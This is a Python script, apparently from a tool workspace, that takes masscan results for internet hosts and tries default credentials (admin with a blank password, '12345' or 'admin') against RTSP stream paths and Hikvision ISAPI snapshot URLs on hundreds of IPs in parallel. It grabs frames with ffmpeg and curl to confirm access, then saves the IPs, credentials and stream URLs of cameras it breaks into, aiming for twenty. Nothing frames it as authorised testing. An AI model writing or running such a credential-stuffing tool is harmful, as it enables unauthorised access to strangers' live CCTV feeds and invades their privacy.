#!/usr/bin/env python3
"""Continue probing to find 20 total cameras"""
import subprocess, os, json, re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

WORK_DIR = '/root/vmos-titan-unified/vmos_titan/playground/cctv-tool'
FRAME_DIR = os.path.join(WORK_DIR, 'hunt_frames')
os.makedirs(FRAME_DIR, exist_ok=True)

# Load already found cameras (now 11 total)
found_ips = set()
existing_file = os.path.join(WORK_DIR, '20_cams_COMPLETE_20260401_011830.json')
if os.path.exists(existing_file):
    with open(existing_file) as f:
        data = json.load(f)
        for s in data.get('streams', []):
            found_ips.add(s['ip'])

print(f'[*] Already found: {len(found_ips)} cameras')

# Load fresh masscan results - skip first 500 already tested
fresh_targets = []
masscan_file = '/tmp/lk_masscan.txt'
if os.path.exists(masscan_file):
    with open(masscan_file) as f:
        for i, line in enumerate(f):
            if i < 500:  # Skip first 500 already tested
                continue
            match = re.search(r'Host:\s+(\d+\.\d+\.\d+\.\d+)', line)
            if match:
                ip = match.group(1)
                if ip not in found_ips:
                    fresh_targets.append(ip)

print(f'[*] Fresh targets available: {len(fresh_targets)}')

# Probe next 500 targets
CREDS = [('admin', ''), ('admin', '12345'), ('admin', 'admin')]
RTSP_PATHS = ['/Streaming/Channels/101', '/Streaming/Channels/1', '/h264/ch1/main/av_stream']

streams = []

def probe_rtsp(ip):
    for user, passwd in CREDS:
        for rpath in RTSP_PATHS:
            auth = f'{user}:{passwd}@' if passwd else f'{user}:@'
            rtsp_url = f'rtsp://{auth}{ip}:554{rpath}'
            frame = os.path.join(FRAME_DIR, f'frame_{ip.replace(".", "_")}.jpg')
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=2, text=True
                )
                if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 1000:
                    found_ips.add(ip)
                    return {
                        'ip': ip, 'user': user, 'password': passwd,
                        'rtsp_url': rtsp_url, 'frame_size': os.path.getsize(frame)
                    }
            except:
                pass
            try:
                if os.path.exists(frame):
                    os.remove(frame)
            except:
                pass
    return None

def probe_http(ip):
    urls = [
        f'http://{ip}:80/ISAPI/Streaming/channels/101/picture',
        f'http://{ip}:8000/ISAPI/Streaming/channels/101/picture',
    ]
    for url in urls:
        frame = os.path.join(FRAME_DIR, f'http_{ip.replace(".", "_")}.jpg')
        try:
            r = subprocess.run(['curl', '-s', '--max-time', '2', '-o', frame, url],
                capture_output=True, timeout=3)
            if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 3000:
                found_ips.add(ip)
                return {
                    'ip': ip, 'user': 'admin', 'password': '',
                    'rtsp_url': f'rtsp://admin:@{ip}:554/Streaming/Channels/101',
                    'frame_size': os.path.getsize(frame), 'method': 'http'
                }
        except:
            pass
        try:
            if os.path.exists(frame):
                os.remove(frame)
        except:
            pass
    return None

# Probe 500 more targets
test_targets = fresh_targets[:500]
print(f'[*] Probing {len(test_targets)} more targets...\n')

with ThreadPoolExecutor(max_workers=120) as pool:
    # RTSP first
    futures = {pool.submit(probe_rtsp, ip): ip for ip in test_targets}
    for fut in as_completed(futures):
        try:
            r = fut.result()
            if r:
                streams.append(r)
                print(f'[+] Stream #{len(streams)}: {r["ip"]} | {r["user"]}:{r["password"]} | rtsp')
                if len(streams) >= 9:  # Need 9 more to reach 20
                    break
        except:
            pass
    
    # HTTP for remaining
    if len(streams) < 9:
        remaining = [ip for ip in test_targets if ip not in found_ips][:100]
        futures = {pool.submit(probe_http, ip): ip for ip in remaining}
        for fut in as_completed(futures):
            try:
                r = fut.result()
                if r:
                    streams.append(r)
                    print(f'[+] Stream #{len(streams)}: {r["ip"]} | {r["user"]}:{r["password"]} | http')
                    if len(streams) >= 9:
                        break
            except:
                pass

print(f'\n[*] Found {len(streams)} additional cameras')

if streams:
    # Merge with existing
    all_streams = data.get('streams', []) + streams
    
    print(f'\n=== TOTAL: {len(all_streams)} LIVE CAMERAS ===')
    for i, s in enumerate(all_streams, 1):
        print(f'{i:>2}. {s["ip"]:>16} | {s.get("user","admin")}:{s.get("password","")}')
    
    out_file = os.path.join(WORK_DIR, f'20_cams_COMPLETE_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
    with open(out_file, 'w') as f:
        json.dump({'count': len(all_streams), 'streams': all_streams}, f, indent=2)
    print(f'\n[+] Saved: {out_file}')
else:
    print('[!] No additional cameras found')
